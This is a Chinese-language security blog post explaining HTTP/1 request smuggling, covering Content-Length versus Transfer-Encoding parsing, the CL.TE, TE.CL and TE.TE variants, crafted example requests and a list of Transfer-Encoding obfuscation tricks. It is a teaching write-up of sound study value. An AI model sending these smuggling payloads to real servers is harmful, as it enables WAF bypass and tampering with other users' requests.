@@ -1,0 +1,1031 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/mad.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="i4G5d">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HTTP Request Smuggling（HTTP 请求走私）漏洞在实战中关注的比较少，但这种冷门的漏洞也可造成较大的影响（绕WAF等），通过本文对HTTP 请求走私的大起底，在平时的工作中多关注这方面的漏洞检测及利用。 HTTP Smuggling1.前置知识 CL（Content-Length）：HTTP协议中的一个消息头（header），它用于指定HTTP请求或响应中消息体的大小，以便接">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP1请求走私">
+<meta property="og:url" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/index.html">
+<meta property="og:site_name" content="i4G5d-Blog">
+<meta property="og:description" content="HTTP Request Smuggling（HTTP 请求走私）漏洞在实战中关注的比较少，但这种冷门的漏洞也可造成较大的影响（绕WAF等），通过本文对HTTP 请求走私的大起底，在平时的工作中多关注这方面的漏洞检测及利用。 HTTP Smuggling1.前置知识 CL（Content-Length）：HTTP协议中的一个消息头（header），它用于指定HTTP请求或响应中消息体的大小，以便接">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101174609570.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031204354811.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031212459776.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101185424078.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101193622057.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101215032189.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101222050650.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031211910914.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031213517814.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031213546270.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031214938148.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031233209915.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031233307567.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031234422394.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031234316568.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031234349456.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031235144364.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101004935135.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101005000583.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101005238054.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101160634855.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101161415860.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101162550555.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101162613376.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101163110353.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101163611710.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101163801972.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101164547199.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101164609822.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101175744160.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101180008674.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101180409387.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101180702937.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181019756.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181047181.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181627340.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181700454.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101182040950.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101182249480.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101183159449.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101184008244.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101184300767.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101190311808.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101191455019.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101191511066.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192356986.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192506618.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192456218.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192702154.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192743425.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101210926816.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101214307891.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101214313953.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101220034769.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101221121291.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101220452816.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101221105739.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101221227356.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101222043923.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101224842932.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101225329695.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101225354747.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101230213901.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101231122574.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101234757098.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101234826909.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101235255723.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101235632350.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101235620747.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102002304135.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102002721863.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102002902474.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102004009682.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102004039369.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102004159867.png">
+<meta property="article:published_time" content="2025-10-31T06:41:36.000Z">
+<meta property="article:modified_time" content="2025-11-01T17:26:20.053Z">
+<meta property="article:author" content="i4G5d">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101174609570.png">
+  
+  
+  
+  <title>HTTP1请求走私 - i4G5d-Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i4g5d.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":4},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>i4G5d</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTTP1请求走私"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-31 14:41" pubdate>
+          2025年10月31日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          87 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTTP1请求走私</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><em>HTTP Request Smuggling（HTTP 请求走私）漏洞在实战中关注的比较少，但这种冷门的漏洞也可造成较大的影响（绕WAF等），通过本文对HTTP 请求走私的大起底，在平时的工作中多关注这方面的漏洞检测及利用。</em></p>
+<h1 id="HTTP-Smuggling"><a href="#HTTP-Smuggling" class="headerlink" title="HTTP Smuggling"></a>HTTP Smuggling</h1><h2 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1.前置知识"></a>1.前置知识</h2><ul>
+<li><p>CL（Content-Length）：HTTP协议中的一个消息头（header），它用于指定HTTP请求或响应中消息体的大小，以便接收方能够正确地接收和处理消息。需要注意的是，在使用Content-Length时，消息体的长度必须要精确指定，否则接收方可能会出现错误。而在某些情况下，由于消息体的大小无法确定，比如在使用分块传输（chunked）的情况下，就需要使用Transfer-Encoding头来指定消息体的编码方式，而不是使用Content-Length来指定消息体的大小</p>
+</li>
+<li><p>TE（Transfer-Encoding）：一种传输编码方式，它用于在传输过程中对消息体进行编码，以便在传输过程中对消息体进行压缩或分块传输等操作。当服务器无法确定响应的大小时，如动态生成的响应或者通过流式传输时，可以使用Transfer-Encoding来实现分块传输（0就是截断）</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br>4<br>Wiki<br>a<br>abcdefghik<br>0<br><br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>关于HTTP1.1：这个版本默认开始了<code>Connection: Keep-alive</code>特性，作用是告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度.。且一个请求用了<code>TE</code>就不能用<code>CL</code>（RFC规范的TE优先级更高，同时存在选TE或者直接报错）</p>
+</li>
+<li><p>TE的解析，最后一个<code>0</code>后面又有两个<code>\r\n</code></p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101174609570.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>再解释一下真正确认漏洞时，更加困难，要确保采用不同TCP连接，因为有些中间件会把不同请求路由到不同后端主机或连接</p>
+</li>
+</ul>
+<h2 id="2-成因"><a href="#2-成因" class="headerlink" title="2.成因"></a>2.成因</h2><pre><code class="hljs">	1. 和Web Cache漏洞以及很多细节漏洞的产生原理一样，请求走私大多发生于**前端服务器**和**后端服务器**对客户端传入的数据理解不一致的情况。
+	2. 当前端或中间件将 HTTP 请求转发到后端服务器时，通常会通过同一个后端网络连接发送多个请求，因为这样效率更高，性能更好。
+</code></pre>
+<ul>
+<li><p>经典的请求走私攻击是指将<code>Content-Length</code>请求头和<code>Transfer-Encoding</code> 响应头都放在同一个 HTTP&#x2F;1 请求中，并操纵这些请求头，是的例如后端对于第一个包产生了截断，前者正常处理，后者就会和第二个包进行拼接，这样就对第二个包造成了影响，详细看下下面这张图。</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031204354811.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ul>
+<p>​	这里注意 对请求走私进行测试时，要把BP的自动更新CL取消</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031212459776.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="3-类型"><a href="#3-类型" class="headerlink" title="3.类型"></a>3.类型</h2><h3 id="CL-TE："><a href="#CL-TE：" class="headerlink" title="CL.TE："></a>CL.TE：</h3><p>​	（可见实验1）</p>
+<ul>
+<li><p>CL.TE：前端服务器使用 <code>Content-Length</code> 头，后端服务器使用 <code>Transfer-Encoding</code> 头</p>
+<p>构造请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http">POST / HTTP/1.1\r\n<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com\r\n<br>...<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive\r\n<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6\r\n<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked\r\n<br>\r\n<br>0\r\n<br>\r\n<br>a<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>前端依据<code>CL</code>截取到<code>a</code>(即所有),</li>
+</ul>
+</li>
+<li><p>后端依据<code>chunked</code>截取到<code>0</code>,</p>
+<ul>
+<li>后面的部分<code>a</code>就会和下一个包拼接为下一个请求</li>
+</ul>
+</li>
+</ul>
+<h3 id="TE-CL："><a href="#TE-CL：" class="headerlink" title="TE.CL："></a>TE.CL：</h3><p>​	（可见实验2）</p>
+<ul>
+<li><p>TE.CL：前端服务器使用 <code>Transfer-Encoding</code> 标头，后端服务器使用 <code>Content-Length</code> 标头。</p>
+<p>构造请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http">POST / HTTP/1.1\r\n<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com\r\n<br>...<br><span class="hljs-attribute">Content-length</span><span class="hljs-punctuation">: </span>4\r\n<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked\r\n<br>\r\n<br>5c\r\n             //chunked的字节数不包含内容的最后的换行,且是HEX<br>aPOST / HTTP/1.1\r\n<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded\r\n<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>5+1\r\n    //CL的字节数不包含第一个换行<br>\r\n<br>0\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>前端依据<code>TE</code>把所有部分上传到后端</li>
+<li>后端依据<code>CL</code>只留下<code>5c\r\n</code>,后面的部分被分到下一个包</li>
+<li>后面的部分中,有一个内层CL,+1就会让这一块再等一个字节(等下一个请求中)</li>
+<li>就达成了毁掉下一个请求, (产生三个包,一个是构造,一个是拼接后的aPOST,一个是被截取首字母的原正常请求；但请求会缩成两个，这样我们访问正常包才会看到走私的结果)</li>
+</ul>
+</li>
+<li><p>这里不用标头法覆盖(yjh:a)是因为后面有个换行0，是要再魔改请求里当做了body，所以必须带上CL</p>
+</li>
+</ul>
+<h3 id="TE-TE："><a href="#TE-TE：" class="headerlink" title="TE.TE："></a>TE.TE：</h3><p>​	（可见实验3）</p>
+<ul>
+<li><p>TE.TE：前端和后端服务器都支持 <code>Transfer-Encoding</code> 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。</p>
+<p>混淆TE头的几个方式</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>xchunked<br><br>Transfer-Encoding : chunked      #前后空格 <br><br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>x<br><br>Transfer-Encoding:[tab]chunked<br><br>[space]Transfer-Encoding: chunked<br><br><span class="hljs-attribute">X</span><span class="hljs-punctuation">: </span>X[\n]Transfer-Encoding: chunked<br><br>Transfer-Encoding<br>: chunked<br></code></pre></td></tr></table></figure>
+
+<p>最后就是呈现成CL.TE或者TE.CL。</p>
+</li>
+</ul>
+<h2 id="4-漏洞检测"><a href="#4-漏洞检测" class="headerlink" title="4.漏洞检测"></a>4.漏洞检测</h2><p>​	<strong>注意有一个点不要混淆</strong>，拼接的思路是前端送进去所有，后端在中间就截断，导致被截下来的部分留到下一个请求包； 但测试的时候是前端送进去的数据会导致后端数据无法完成闭合而一直等待，导致超时，就算你后面跟上一个请求也不会把测试包拼完整。</p>
